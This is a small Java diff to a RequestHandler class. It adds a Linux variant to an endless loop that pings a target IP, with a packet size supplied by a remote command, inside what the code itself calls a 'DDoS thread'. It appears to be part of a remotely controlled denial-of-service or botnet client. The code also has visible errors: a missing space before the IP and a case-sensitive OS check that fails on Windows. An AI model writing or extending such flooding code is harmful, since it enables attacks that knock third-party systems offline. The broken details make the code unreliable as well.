@@ -25,9 +25,15 @@ public class RequestHandler {
 
 						while (true) {
 							try {
-								Process p = Runtime.getRuntime()
-										.exec("ping -l " + pkgIn.getObjects()[1] + " -n 1" + ip);
-								p.waitFor();
+								if (System.getProperty("os.name").contains("windows")) {
+									Process p = Runtime.getRuntime()
+											.exec("ping -l " + pkgIn.getObjects()[1] + " -n 1" + ip);
+									p.waitFor();
+								} else {
+									Process p = Runtime.getRuntime()
+											.exec("ping -s " + pkgIn.getObjects()[1] + " -c 1" + ip);
+									p.waitFor();
+								}
 							} catch (InterruptedException e) {
 								System.out.println("Exiting DDoS thread.");
 							} catch (IOException e) {
